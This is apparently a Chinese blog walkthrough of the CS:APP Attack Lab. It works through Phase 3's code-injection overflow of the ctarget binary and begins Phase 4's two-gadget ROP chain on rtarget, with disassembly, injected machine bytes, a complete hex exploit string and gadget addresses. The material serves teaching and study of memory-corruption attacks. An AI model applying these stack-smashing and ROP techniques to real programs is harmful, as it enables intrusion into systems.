  <span class="token number">401927</span><span class="token operator">:</span>	b8 <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       	mov    $<span class="token number">0x0</span><span class="token punctuation">,</span><span class="token operator">%</span>eax
  <span class="token number">40192</span>c<span class="token operator">:</span>	e8 bf f4 ff ff       	callq  <span class="token number">400</span>df0 <span class="token operator">&lt;</span>__printf_chk@plt<span class="token operator">></span>
  <span class="token number">401931</span><span class="token operator">:</span>	bf <span class="token number">03</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       	mov    $<span class="token number">0x3</span><span class="token punctuation">,</span><span class="token operator">%</span>edi
  <span class="token number">401936</span><span class="token operator">:</span>	e8 <span class="token number">52</span> <span class="token number">03</span> <span class="token number">00</span> <span class="token number">00</span>       	callq  <span class="token number">401</span>c8d <span class="token operator">&lt;</span>validate<span class="token operator">></span>
  <span class="token number">40193</span>b<span class="token operator">:</span>	eb <span class="token number">21</span>                	jmp    <span class="token number">40195</span>e <span class="token operator">&lt;</span>touch3<span class="token operator">+</span><span class="token number">0x64</span><span class="token operator">></span>
  <span class="token number">40193</span>d<span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">89</span> da             	mov    <span class="token operator">%</span>rbx<span class="token punctuation">,</span><span class="token operator">%</span>rdx
  <span class="token number">401940</span><span class="token operator">:</span>	be <span class="token number">60</span> <span class="token number">31</span> <span class="token number">40</span> <span class="token number">00</span>       	mov    $<span class="token number">0x403160</span><span class="token punctuation">,</span><span class="token operator">%</span>esi
  <span class="token number">401945</span><span class="token operator">:</span>	bf <span class="token number">01</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       	mov    $<span class="token number">0x1</span><span class="token punctuation">,</span><span class="token operator">%</span>edi
  <span class="token number">40194</span>a<span class="token operator">:</span>	b8 <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       	mov    $<span class="token number">0x0</span><span class="token punctuation">,</span><span class="token operator">%</span>eax
  <span class="token number">40194f</span><span class="token operator">:</span>	e8 <span class="token number">9</span>c f4 ff ff       	callq  <span class="token number">400</span>df0 <span class="token operator">&lt;</span>__printf_chk@plt<span class="token operator">></span>
  <span class="token number">401954</span><span class="token operator">:</span>	bf <span class="token number">03</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       	mov    $<span class="token number">0x3</span><span class="token punctuation">,</span><span class="token operator">%</span>edi
  <span class="token number">401959</span><span class="token operator">:</span>	e8 f1 <span class="token number">03</span> <span class="token number">00</span> <span class="token number">00</span>       	callq  <span class="token number">401</span>d4f <span class="token operator">&lt;</span>fail<span class="token operator">></span>
  <span class="token number">40195</span>e<span class="token operator">:</span>	bf <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       	mov    $<span class="token number">0x0</span><span class="token punctuation">,</span><span class="token operator">%</span>edi
  <span class="token number">401963</span><span class="token operator">:</span>	e8 d8 f4 ff ff       	callq  <span class="token number">400e40</span> <span class="token operator">&lt;</span>exit@plt<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Hexmatch C &amp;&amp;Assembly Code</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* Compare string to hex represention of unsigned value */</span><span class="token comment">//将字符串与无符号值的十六进制表示进行比较</span>
<span class="token keyword">int</span> <span class="token function">hexmatch</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">char</span> cbuf<span class="token punctuation">[</span><span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">/*Make position of check string unpredictable */</span><span class="token comment">//使检查字符串的位置不可预测</span>
<span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> cbuf <span class="token operator">+</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">;</span>
<span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%.8x"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将val转为16进制存入s</span>
<span class="token keyword">return</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>sval<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token number">000000000040184</span>c <span class="token operator">&lt;</span>hexmatch<span class="token operator">></span><span class="token operator">:</span>
  <span class="token number">40184</span>c<span class="token operator">:</span>	<span class="token number">41</span> <span class="token number">54</span>                	push   <span class="token operator">%</span>r12
  <span class="token number">40184</span>e<span class="token operator">:</span>	<span class="token number">55</span>                   	push   <span class="token operator">%</span>rbp
  <span class="token number">40184f</span><span class="token operator">:</span>	<span class="token number">53</span>                   	push   <span class="token operator">%</span>rbx
  <span class="token number">401850</span><span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">83</span> c4 <span class="token number">80</span>          	add    $<span class="token number">0xffffffffffffff80</span><span class="token punctuation">,</span><span class="token operator">%</span>rsp
  <span class="token number">401854</span><span class="token operator">:</span>	<span class="token number">41</span> <span class="token number">89</span> fc             	mov    <span class="token operator">%</span>edi<span class="token punctuation">,</span><span class="token operator">%</span>r12d
  <span class="token number">401857</span><span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">89</span> f5             	mov    <span class="token operator">%</span>rsi<span class="token punctuation">,</span><span class="token operator">%</span>rbp
  <span class="token number">40185</span>a<span class="token operator">:</span>	<span class="token number">64</span> <span class="token number">48</span> <span class="token number">8</span>b <span class="token number">04</span> <span class="token number">25</span> <span class="token number">28</span> <span class="token number">00</span> 	mov    <span class="token operator">%</span>fs<span class="token operator">:</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token operator">%</span>rax
  <span class="token number">401861</span><span class="token operator">:</span>	<span class="token number">00</span> <span class="token number">00</span> 
  <span class="token number">401863</span><span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">89</span> <span class="token number">44</span> <span class="token number">24</span> <span class="token number">78</span>       	mov    <span class="token operator">%</span>rax<span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">(</span><span class="token operator">%</span>rsp<span class="token punctuation">)</span>
  <span class="token number">401868</span><span class="token operator">:</span>	<span class="token number">31</span> c0                	<span class="token operator">xor</span>    <span class="token operator">%</span>eax<span class="token punctuation">,</span><span class="token operator">%</span>eax
  <span class="token number">40186</span>a<span class="token operator">:</span>	e8 <span class="token number">41</span> f5 ff ff       	callq  <span class="token number">400</span>db0 <span class="token operator">&lt;</span>random@plt<span class="token operator">></span>
  <span class="token number">40186f</span><span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">89</span> c1             	mov    <span class="token operator">%</span>rax<span class="token punctuation">,</span><span class="token operator">%</span>rcx
  <span class="token number">401872</span><span class="token operator">:</span>	<span class="token number">48</span> ba <span class="token number">0</span>b d7 a3 <span class="token number">70</span> <span class="token number">3</span>d 	movabs $<span class="token number">0xa3d70a3d70a3d70b</span><span class="token punctuation">,</span><span class="token operator">%</span>rdx
  <span class="token number">401879</span><span class="token operator">:</span>	<span class="token number">0</span>a d7 a3 
  <span class="token number">40187</span>c<span class="token operator">:</span>	<span class="token number">48</span> f7 ea             	imul   <span class="token operator">%</span>rdx
  <span class="token number">40187f</span><span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">01</span> ca             	add    <span class="token operator">%</span>rcx<span class="token punctuation">,</span><span class="token operator">%</span>rdx
  <span class="token number">401882</span><span class="token operator">:</span>	<span class="token number">48</span> c1 fa <span class="token number">06</span>          	sar    $<span class="token number">0x6</span><span class="token punctuation">,</span><span class="token operator">%</span>rdx
  <span class="token number">401886</span><span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">89</span> c8             	mov    <span class="token operator">%</span>rcx<span class="token punctuation">,</span><span class="token operator">%</span>rax
  <span class="token number">401889</span><span class="token operator">:</span>	<span class="token number">48</span> c1 f8 <span class="token number">3f</span>          	sar    $<span class="token number">0x3f</span><span class="token punctuation">,</span><span class="token operator">%</span>rax
  <span class="token number">40188</span>d<span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">29</span> c2             	sub    <span class="token operator">%</span>rax<span class="token punctuation">,</span><span class="token operator">%</span>rdx
  <span class="token number">401890</span><span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">8</span>d <span class="token number">04</span> <span class="token number">92</span>          	<span class="token function">lea</span>    <span class="token punctuation">(</span><span class="token operator">%</span>rdx<span class="token punctuation">,</span><span class="token operator">%</span>rdx<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span>rax
  <span class="token number">401894</span><span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">8</span>d <span class="token number">04</span> <span class="token number">80</span>          	<span class="token function">lea</span>    <span class="token punctuation">(</span><span class="token operator">%</span>rax<span class="token punctuation">,</span><span class="token operator">%</span>rax<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span>rax
  <span class="token number">401898</span><span class="token operator">:</span>	<span class="token number">48</span> c1 e0 <span class="token number">02</span>          	shl    $<span class="token number">0x2</span><span class="token punctuation">,</span><span class="token operator">%</span>rax
  <span class="token number">40189</span>c<span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">29</span> c1             	sub    <span class="token operator">%</span>rax<span class="token punctuation">,</span><span class="token operator">%</span>rcx
  <span class="token number">40189f</span><span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">8</span>d <span class="token number">1</span>c <span class="token number">0</span>c          	<span class="token function">lea</span>    <span class="token punctuation">(</span><span class="token operator">%</span>rsp<span class="token punctuation">,</span><span class="token operator">%</span>rcx<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span>rbx
  <span class="token number">4018</span>a3<span class="token operator">:</span>	<span class="token number">45</span> <span class="token number">89</span> e0             	mov    <span class="token operator">%</span>r12d<span class="token punctuation">,</span><span class="token operator">%</span>r8d
  <span class="token number">4018</span>a6<span class="token operator">:</span>	b9 e2 <span class="token number">30</span> <span class="token number">40</span> <span class="token number">00</span>       	mov    $<span class="token number">0x4030e2</span><span class="token punctuation">,</span><span class="token operator">%</span>ecx
  <span class="token number">4018</span>ab<span class="token operator">:</span>	<span class="token number">48</span> c7 c2 ff ff ff ff 	mov    $<span class="token number">0xffffffffffffffff</span><span class="token punctuation">,</span><span class="token operator">%</span>rdx
  <span class="token number">4018</span>b2<span class="token operator">:</span>	be <span class="token number">01</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       	mov    $<span class="token number">0x1</span><span class="token punctuation">,</span><span class="token operator">%</span>esi
  <span class="token number">4018</span>b7<span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">89</span> df             	mov    <span class="token operator">%</span>rbx<span class="token punctuation">,</span><span class="token operator">%</span>rdi
  <span class="token number">4018</span>ba<span class="token operator">:</span>	b8 <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       	mov    $<span class="token number">0x0</span><span class="token punctuation">,</span><span class="token operator">%</span>eax
  <span class="token number">4018</span>bf<span class="token operator">:</span>	e8 ac f5 ff ff       	callq  <span class="token number">400e70</span> <span class="token operator">&lt;</span>__sprintf_chk@plt<span class="token operator">></span>
  <span class="token number">4018</span>c4<span class="token operator">:</span>	ba <span class="token number">09</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>       	mov    $<span class="token number">0x9</span><span class="token punctuation">,</span><span class="token operator">%</span>edx
  <span class="token number">4018</span>c9<span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">89</span> de             	mov    <span class="token operator">%</span>rbx<span class="token punctuation">,</span><span class="token operator">%</span>rsi
  <span class="token number">4018</span>cc<span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">89</span> ef             	mov    <span class="token operator">%</span>rbp<span class="token punctuation">,</span><span class="token operator">%</span>rdi
  <span class="token number">4018</span>cf<span class="token operator">:</span>	e8 cc f3 ff ff       	callq  <span class="token number">400</span>ca0 <span class="token operator">&lt;</span>strncmp@plt<span class="token operator">></span>
  <span class="token number">4018</span>d4<span class="token operator">:</span>	<span class="token number">85</span> c0                	test   <span class="token operator">%</span>eax<span class="token punctuation">,</span><span class="token operator">%</span>eax
  <span class="token number">4018</span>d6<span class="token operator">:</span>	<span class="token number">0f</span> <span class="token number">94</span> c0             	sete   <span class="token operator">%</span>al
  <span class="token number">4018</span>d9<span class="token operator">:</span>	<span class="token number">0f</span> b6 c0             	movzbl <span class="token operator">%</span>al<span class="token punctuation">,</span><span class="token operator">%</span>eax
  <span class="token number">4018</span>dc<span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">8</span>b <span class="token number">74</span> <span class="token number">24</span> <span class="token number">78</span>       	mov    <span class="token number">0x78</span><span class="token punctuation">(</span><span class="token operator">%</span>rsp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span>rsi
  <span class="token number">4018e1</span><span class="token operator">:</span>	<span class="token number">64</span> <span class="token number">48</span> <span class="token number">33</span> <span class="token number">34</span> <span class="token number">25</span> <span class="token number">28</span> <span class="token number">00</span> 	<span class="token operator">xor</span>    <span class="token operator">%</span>fs<span class="token operator">:</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token operator">%</span>rsi
  <span class="token number">4018e8</span><span class="token operator">:</span>	<span class="token number">00</span> <span class="token number">00</span> 
  <span class="token number">4018</span>ea<span class="token operator">:</span>	<span class="token number">74</span> <span class="token number">05</span>                	je     <span class="token number">4018f</span>1 <span class="token operator">&lt;</span>hexmatch<span class="token operator">+</span><span class="token number">0xa5</span><span class="token operator">></span>
  <span class="token number">4018</span>ec<span class="token operator">:</span>	e8 ef f3 ff ff       	callq  <span class="token number">400</span>ce0 <span class="token operator">&lt;</span>__stack_chk_fail@plt<span class="token operator">></span>
  <span class="token number">4018f</span>1<span class="token operator">:</span>	<span class="token number">48</span> <span class="token number">83</span> ec <span class="token number">80</span>          	sub    $<span class="token number">0xffffffffffffff80</span><span class="token punctuation">,</span><span class="token operator">%</span>rsp
  <span class="token number">4018f</span>5<span class="token operator">:</span>	<span class="token number">5</span>b                   	pop    <span class="token operator">%</span>rbx
  <span class="token number">4018f</span>6<span class="token operator">:</span>	<span class="token number">5</span>d                   	pop    <span class="token operator">%</span>rbp
  <span class="token number">4018f</span>7<span class="token operator">:</span>	<span class="token number">41</span> <span class="token number">5</span>c                	pop    <span class="token operator">%</span>r12
  <span class="token number">4018f</span>9<span class="token operator">:</span>	c3                   	retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.<code>您必须使其显示为touch3，就像您已将cookie的字符串表示形式作为其参数一样。</code><br>Some Advice:<br>• You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”<code>您需要在进攻字符串中包含一个代表你cookie的字符串。该字符串应由八个十六进制数字 (从最高到最低有效排序) 组成，没有前导 “0x”。</code><br>• Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need.<code>回想一下，字符串在C中表示为字节序列，后跟值为0的字节。在任何Linux机器上键入 “man ascii” 以查看所需字符的字节表示。</code><br>• Your injected code should set register %rdi to the address of this string.<code>注入的代码应将寄存器 % rdi设置为该字符串的地址。</code><br>• When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.<code> 当调用函数hexmatch和strncmp时，它们将数据推送到堆栈上，覆盖保存getbuf使用的缓冲区的内存部分。因此，您需要小心放置cookie的字符串表示形式。</code></p>
<p>解决问题逻辑如下:</p>
<p>我们要实现的功能是让cookie和sval相匹配的话,那么就能通关,sval存放于寄存器%rdi中,以16进制的方式存在,而比较函数中会将cookie转化为16进制,所以我们要将cookie转化为16进制然后写入到%rdi</p>
<p>在呼叫touch3之前我们要把char *sval的值(其指针指向sval这个地址的字串)存入%rdi中,而该地址应该存的是cookie转化为ascii码表示,同时要知道hexmatch一上来就要了110个byte,所以很有可能把缓冲区给重新分配.</p>
<p>为了防止存放的字符串被hexmatch和strncmp覆盖,不能再0x5561dc78-0x5561dca0者之间存放字串,而0x5561dc78是分配的最低位置,0x5561dca0是放置跳转地址的位置,所以我们把字串放在test的栈空间之中比如:0x5561dca8.</p>
<p>操作如下</p>
<ul>
<li>把cookie转换成ascii码,通过查表的方式把cookie挨个转成ascii码.\0–&gt;00</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">35 39 62 39 39 37 66 61 00 #00是字符串结尾<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>将touch3地址压入栈中</li>
<li>将%rsp地址+8—&gt;到%rdi中(当然也可以写精确地址0x5561dca8)</li>
<li>retq</li>
</ul>
<p>构建以下命令,保存为t3.s文件</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push $0x004018fa
lea 0x8(%rsp),%rdi
retq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>然后用Phase_2的方法得到机器指令代码</p>
<pre class="line-numbers language-none"><code class="language-none">gcc -c -Og t3.s
objdump -d t3.o&gt;t3.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>会得到如下代码</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">t3.o:     file format elf64-x86-64
0000000000000000 &lt;.text&gt;:
   0:	68 fa 18 40 00       	pushq  $0x4018fa
   5:	48 8d 7c 24 08       	lea    0x8(%rsp),%rdi
   a:	c3                   	retq   
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下来我们就可以编写sol3.txt,记住64位机器输入指令记得补零,不然可能段错误</p>
<pre class="line-numbers language-none"><code class="language-none">68 fa 18 40 00 48 8d 7c 
24 08 c3 00 00 00 00 00&#x2F;&#x2F;上面的是机器指令代码
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00&#x2F;&#x2F;填充字符
78 dc 61 55 00 00 00 00 &#x2F;&#x2F;还是跳转到栈顶,需要padding
35 39 62 39 39 37 66 61 &#x2F;&#x2F;存再test栈帧中的值,0x5561dca0
00 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后输入以下指令</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;hex2raw &lt;sol3.txt &gt;sol3r.txt &amp;&amp; .&#x2F;ctarget -q -i sol3r.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>若看见以下界面,则恭喜通关!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220967.png" alt="image-20240302020227034"></p>
<h1 id="Part-II-ROP"><a href="#Part-II-ROP" class="headerlink" title="Part II: ROP"></a>Part II: ROP</h1><h2 id="总览-1"><a href="#总览-1" class="headerlink" title="总览"></a>总览</h2><blockquote>
<p>ROP: Return-Oriented Programming</p>
<p>什么叫Gadgets?思索许久,发现就是断章取义,重塑代码,草船借箭</p>
</blockquote>
<p>得到rtarget的汇编</p>
<pre class="line-numbers language-none"><code class="language-none">objdump -d rtarget&gt;rtarget.s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Part2的限制:</p>
<ol>
<li>恢复了栈的随机化,每次栈的位置都不一样,无法决定把代码放到哪个位置</li>
<li>恢复了栈的区域标记,分为可写,可读,可执行.</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">堆栈包含一系列小工具地址。每个gadget由一系列指令字节组成，最后一个是0xc3，编码ret指令。当程序从此配置开始执行 ret 指令时，它将启动一系列 gadget 执行，每个 gadget 末尾的 ret 指令导致程序跳转到下一个 gadget 的开头。
小工具可以使用与编译器生成的汇编语言语句相对应的代码，尤其是函数末尾的语句。在实践中，这种形式可能有一些有用的小工具，但不足以实现许多重要的操作。例如，编译函数不太可能将 popq %rdi 作为 ret 之前的最后一条指令。幸运的是，对于面向字节的指令集（例如 x86-64），通常可以通过从指令字节序列的其他部分提取模式来找到小工具。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>举一个Gadgets的小例子,这有一个很有意思的小现象</p>
<p>Setval_210’s C &amp;&amp; Assembly Code</p>
<pre class="line-numbers language-none"><code class="language-none">void setval_210(unsigned * p) &#123; 
* p &#x3D; 3347663060U; 
&#125;

0000000000400f15 &lt;setval_210&gt;:
400f15: c7 07 d4 48 89 c7   movl  $0xc78948d4,(%rdi)
400f1b: c3                  retq
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The byte sequence 48 89 c7 encodes the instruction movq %rax, %rdi. (See Figure 3A for the encodings of useful movq instructions.) This sequence is followed by byte value c3, which encodes the ret instruction. The function starts at address 0x400f15, and the sequence starts on the fourth byte of the function. Thus, this code contains a gadget, having a starting address of 0x400f18, that will copy the 64-bit value in register %rax to register %rdi.</p>
<p><code>断章取义</code></p>
<p><strong>从0x400f18看到0x400f1b表示的意思则是把%rax的值传到%rdi,即为movq %rax , %rdi</strong></p>
<p>Your code for RTARGET contains a number of functions similar to the setval_210 function shown above in a region we refer to as the gadget farm. Your job will be to identify useful gadgets in the gadget farm and use these to perform attacks similar to those you did in Phases 2 and 3.</p>
<p>Important: The gadget farm is demarcated by functions start_farm and end_farm in your copy of rtarget. Do not attempt to construct gadgets from other portions of the program code.</p>
<pre class="line-numbers language-none"><code class="language-none">您的 RTARGET 代码包含许多与上面所示的 setval_210 函数类似的函数，这些函数位于我们称为小工具场的区域中。您的工作将是识别小工具场中有用的小工具，并使用它们来执行类似于您在第 2 阶段和第 3 阶段中所做的攻击。
重要提示：小工具场由 rtarget 副本中的函数 start_farm 和 end_farm 划分。不要尝试从程序代码的其他部分构造小工具。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase_4"></a>Phase_4</h2><p>Phase_4要求:</p>
<p>For Phase 4,you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the ﬁrst eight x86-64 registers (%rax–%rdi).</p>
<ul>
<li>movq : The codes for these are shown in Figure 3A.</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127944.png" alt="image-20240229212126798"></p>
<ul>
<li>popq : The codes for these are shown in Figure 3B.</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127952.png" alt="image-20240229212144522"></p>
<ul>
<li><p>ret : This instruction is encoded by the single byte 0xc3.</p>
</li>
<li><p>nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single byte 0x90. Its only effect is to cause the program counter to be incremented by 1.</p>
</li>
</ul>
<p>Some Advice:</p>
<ul>
<li><p>All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions start_farm and mid_farm.</p>
</li>
<li><p>You can do this attack with just two gadgets.</p>
</li>
<li><p>When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.</p>
</li>
</ul>
<p>要求总结:</p>
<ul>
<li><p>复现phase_2的操作</p>
<pre class="line-numbers language-none"><code class="language-none">mov $0x59b997fa, %rdi
pushq $0x4017ec
ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>只需要用only 第一到第八个寄存器(%rax —&gt; %rdi)</p>
</li>
<li><p>需要注意0xc3为标志的ret</p>
</li>
<li><p>只需要使用两个gadgets</p>
</li>
</ul>
<p>我们知道需要的gadget都存在farm.c中,所以我们先farm.c编译再反汇编得到机器指令+地址,便于寻找,输入以下指令</p>
<p><strong>一定要注意要输入-Og,不然就会使用stack frame pointer,会变得比较复杂</strong></p>
<pre class="line-numbers language-none"><code class="language-none">gcc -c -Og farm.c
objdump -d farm.o&gt;farm.s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>我们便会得到farm.s,我们要做的是把0x59b997fa这个值弄到%rdi里面,但是我们知道我们不能用mov来直接mov立即数,因为farm中没有cookie的值,只能另辟蹊径,把这个cookie的值压入栈中然后再popq</p>
<p>操作顺序:</p>
<ul>
<li><p>转移cookie的值转移到%rdi中</p>
</li>
<li><p>把$0x4017ec(touch2地址)压入栈中</p>
</li>
<li><p>ret</p>
</li>
</ul>
<p>这是相关联的函数,需要在其中找到gadgets</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000000000 &lt;start_farm&gt;:
   0:	f3 0f 1e fa          	endbr64 
   4:	b8 01 00 00 00       	mov    $0x1,%eax
   9:	c3                   	retq   

000000000000000a &lt;getval_142&gt;:
   a:	f3 0f 1e fa          	endbr64 
   e:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  13:	c3                   	retq   

0000000000000014 &lt;addval_273&gt;:
  14:	f3 0f 1e fa          	endbr64 
  18:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  1e:	c3                   	retq   

000000000000001f &lt;addval_219&gt;:
  1f:	f3 0f 1e fa          	endbr64 
  23:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  29:	c3                   	retq   

000000000000002a &lt;setval_237&gt;:
  2a:	f3 0f 1e fa          	endbr64 
  2e:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  34:	c3                   	retq   

0000000000000035 &lt;setval_424&gt;:
  35:	f3 0f 1e fa          	endbr64 
  39:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  3f:	c3                   	retq   

0000000000000040 &lt;setval_470&gt;:
  40:	f3 0f 1e fa          	endbr64 
  44:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4a:	c3                   	retq   

000000000000004b &lt;setval_426&gt;:
  4b:	f3 0f 1e fa          	endbr64 
  4f:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  55:	c3                   	retq   

0000000000000056 &lt;getval_280&gt;:
  56:	f3 0f 1e fa          	endbr64 
  5a:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  5f:	c3                   	retq   

0000000000000060 &lt;mid_farm&gt;:
  60:	f3 0f 1e fa          	endbr64 
  64:	b8 01 00 00 00       	mov    $0x1,%eax
  69:	c3                   	retq  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有意识的搜索%rdi这个寄存器相关的机器指令<code>48 89 c7</code>,搜索和%rax有关的<code>58</code>,便注意到这两个函数,<addval_273>和<addval_219>,在rtarget的反汇编中把他找出来(这样能找到地址)</p>
<pre class="line-numbers language-none"><code class="language-none">00000000004019a0 &lt;addval_273&gt;:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 &lt;addval_219&gt;:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当273&gt;函数从0x004019a2开始时,会执行<code>mov %rax,%rdi</code>,<code>ret</code></p>
<p>当219&gt;函数从0x004019ab开始时,会执行<code>pop %rax</code>,<code>ret</code>.</p>
<p>这样我们不就可以组合出我们的代码了吗,通过一个一个ret来吧不同的gadget连接在一起</p>
<p>答案框架如下,</p>
<pre class="line-numbers language-none"><code class="language-none">---栈底---
0x4017ec    &lt;---touch2地址
0x4019a2    &lt;--gadget2
cookie            #0x59b997fa   &lt;----%rsp
 0x4019ab     &lt;---gadget1
---栈顶---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

